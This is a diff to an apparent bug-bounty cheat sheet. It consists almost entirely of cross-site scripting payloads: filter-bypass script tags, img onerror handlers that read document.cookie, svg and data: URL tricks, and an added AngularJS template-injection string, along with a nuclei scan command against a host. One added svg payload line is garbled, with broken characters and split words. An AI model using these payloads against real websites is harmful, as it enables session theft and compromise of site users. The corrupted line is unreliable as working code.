@@ -242,6 +242,9 @@ nuclei -u https://targets.com:8858 -t /root/nuclei-template/
 • <<scrip<scriptT>alert(1);
 • "><img src/onerror=prompt(document.cookie)>
 • "><img src=x onerror=alert(document.domain)> 
+• «sVg
+• OnPointerEnter= "location= lavas + cript:ale + 'rt%2 + '81%2° +9%//</div">
+%7B%7Bconstructor.constructor(%27alert(1337)%27)()%7D%7D
 • "12345-abc-1-23456<scr<script>ipt>alert(document.cookie)<%2Fscr<script>ipt>.img"
 • <svg><animate xlink:href=#x attributeName=href values=&#106;avascript:alert(1) /><a id=x><rect width=100 height=100 /></a>
 • <script src="data:,alert(1)%250A-->
